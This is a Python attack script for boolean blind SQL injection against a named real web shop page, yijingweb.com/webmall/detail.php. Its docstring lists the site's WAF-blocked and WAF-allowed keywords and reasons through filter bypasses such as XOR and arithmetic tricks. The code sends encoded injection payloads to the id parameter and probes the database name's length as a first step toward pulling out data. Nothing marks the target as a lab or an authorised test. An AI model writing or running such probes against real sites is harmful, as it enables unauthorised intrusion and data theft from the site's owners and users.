#!/usr/bin/env python3
"""Boolean blind SQLi on yijingweb - extract data via (select ...) subqueries
WAF blocks: and/or/union/sleep/benchmark/user()/#/-- 
WAF allows: select/substr/length/quote
Boolean oracle: id=686' OR (condition) ... can't use OR either.
Use: id=686'-(condition)-'  (arithmetic: subtract 1 when true)
Or: id=686'/(condition)/' - division error when false? messy.
Better: id=686' AND ... blocked. 
Use: id=686'|(condition) -- no.
Actually: use id=686' XOR (condition) -- XOR might pass?
Try: id=686' XOR (select 1)=1 -- and id=686' XOR (select 1)=2
"""
import urllib.request, urllib.parse, re, sys

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def test(payload, tag):
    u = BASE + "?id=686" + payload
    code, body = fetch(u)
    is_err = "MySQL Error" in body or "Database error" in body
    waf = code == 403 and len(body) < 2000
    print("%-40s code=%s waf=%s sqlerr=%s" % (tag, code, waf, is_err))

# probe valid boolean primitives
print("=== boolean primitives ===")
test("%27%20XOR%20(select%201)=1--%20", "XOR-true")
test("%27%20XOR%20(select%201)=2--%20", "XOR-false")
test("%27%20AND%20(select%201)=1--%20", "AND-subq")
test("%27%20OR%20(select%201)=1--%20", "OR-subq")
test("%27%20(select%201)--%20", "paren-nop")
# maybe the id is used in numeric context too? try arithmetic
test("%27-(select%201)-%27", "arith-sub")
test("%27%20XOR%20length(database())=1--%20", "XOR-len=1")
test("%27%20XOR%20length(database())=2--%20", "XOR-len=2")
